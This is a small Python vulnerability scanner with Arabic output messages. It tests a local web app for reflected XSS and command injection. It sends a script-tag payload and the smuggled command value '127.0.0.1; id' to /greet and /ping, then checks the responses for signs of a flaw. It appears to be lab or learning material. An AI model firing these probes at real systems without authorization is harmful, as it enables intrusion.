import requests
import sys

BANNER = """
=========================================
    🛡️ PHANTOM SCANNER - v2.0 🛡️
    ماسح الثغرات الشامل (Phantom Framework)
=========================================
"""

def scan_target(target_url):
    print(BANNER)
    print(f"[*] جاري بدء الفحص الشامل للهدف: {target_url}\n")
    
    # 1. اختبار ثغرة Reflected XSS
    print("[*] جاري فحص مسار XSS (/greet)...")
    xss_payload = "<script>alert('XSS_TEST')</script>"
    xss_url = f"{target_url}/greet?name={xss_payload}"
    
    try:
        response_xss = requests.get(xss_url)
        if xss_payload in response_xss.text:
            print(f"[!] تنبيه خطير: تم اكتشاف ثغرة Reflected XSS!")
            print(f"    [+] الرابط المصاب: {xss_url}\n")
        else:
            print(f"[-] مسار XSS محصن وآمن ضد الحقن البرمجي 🛡️\n")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] خطأ: تعذر الاتصال بالسيرفر في مسار XSS.")

    # 2. اختبار ثغرة Command Injection (عبر محاولة إرسال أمر مع الـ IP)
    print("[*] جاري فحص مسار Command Injection (/ping)...")
    ping_url = f"{target_url}/ping"
    # نجرب إرسال IP وهمي معه فاصل أمر لتجربة الاستجابة
    payload_data = {"ip": "127.0.0.1; id"}
    
    try:
        response_ping = requests.post(ping_url, data=payload_data)
        # إذا ظهرت نتائج أمر id مثل uid أو gid فهذا يدل على وجود الثغرة
        if "uid=" in response_ping.text or "gid=" in response_ping.text:
            print(f"[!] تنبيه خطير جداً: تم اكتشاف ثغرة Command Injection في صفحة الـ Ping!")
        else:
            print(f"[-] مسار الـ Ping محصن وآمن ضد حقن الأوامر 🛡️")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] خطأ: تعذر الاتصال بالسيرفر في مسار الـ Ping.")
        
    print("\n[+] انتهى الفحص الشامل بنجاح يا قائد!")

if __name__ == "__main__":
    target = "http://127.0.0.1:5000"
    scan_target(target)

